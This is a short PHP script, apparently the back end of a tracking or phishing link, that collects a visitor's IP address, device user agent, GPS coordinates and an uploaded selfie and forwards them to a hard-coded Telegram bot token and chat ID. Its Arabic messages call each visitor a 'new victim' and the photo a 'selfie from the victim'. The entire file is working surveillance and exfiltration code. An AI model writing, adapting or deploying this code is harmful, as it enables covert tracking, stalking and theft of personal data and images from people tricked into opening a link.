<?php
$token = "7883114460:AAGRES__ZgZwozECW5uaoDI3F2XtsRZc8w8";
$chat_id = "5443931276";

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$date = date("Y-m-d H:i:s");

$data = json_decode(file_get_contents("php://input"), true);
$lat = isset($data['lat']) ? $data['lat'] : null;
$lon = isset($data['lon']) ? $data['lon'] : null;
$location_link = ($lat && $lon) ? "https://maps.google.com/?q=$lat,$lon" : "📍 الموقع غير متوفر";

$text = "📥 ضحية جديدة دخلت على الرابط:

📅 التاريخ: $date
🌐 IP: $ip
📱 الجهاز: $user_agent
📍 الموقع: $location_link";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($text));

if (isset($_FILES['image'])) {
    $image = $_FILES['image']['tmp_name'];
    $send_photo_url = "https://api.telegram.org/bot$token/sendPhoto";

    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath($image)),
        'caption' => "📸 صورة سيلفي من الضحية"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $send_photo_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_exec($ch);
    curl_close($ch);
}
?>
